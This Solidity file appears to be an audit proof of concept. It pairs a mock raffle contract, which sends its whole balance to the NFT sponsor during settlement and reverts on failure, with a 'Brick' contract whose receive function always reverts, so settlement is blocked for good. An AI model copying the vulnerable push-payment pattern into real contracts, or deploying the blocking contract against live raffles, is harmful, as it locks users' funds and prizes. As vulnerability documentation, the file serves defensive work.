// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import {IERC721} from "@openzeppelin/token/ERC721/IERC721.sol";

contract MockBrokenSettleRafflePOC {
    IERC721 public immutable collection;
    uint256 entriesLength = 1;
    address sponsor;

    error TransferFailed();

    bool public reset;

    constructor(IERC721 _collection) {
        collection = _collection;
    }

    receive() external payable {}

    function depositBasedBitsMock(uint256 tokenId) external {
        collection.transferFrom(msg.sender, address(this), tokenId);
        sponsor = msg.sender;
    }

    function settleRaffleMock() external {
        if (entriesLength == 0) {} else {
            (bool success,) = sponsor.call{value: address(this).balance}("");
            if (!success) revert TransferFailed();
        }

        /// This will never hit, the contract loop will break
        reset = true;
    }
}

contract Brick {
    IERC721 public immutable collection;
    MockBrokenSettleRafflePOC private mock;

    constructor(IERC721 _collection, MockBrokenSettleRafflePOC _mock) {
        mock = _mock;
        collection = _collection;
    }

    receive() external payable {
        revert();
    }

    function CallDepositBasedBitsMock(uint256 _tokenId) public {
        collection.setApprovalForAll(address(mock), true);
        mock.depositBasedBitsMock(_tokenId);
    }
}
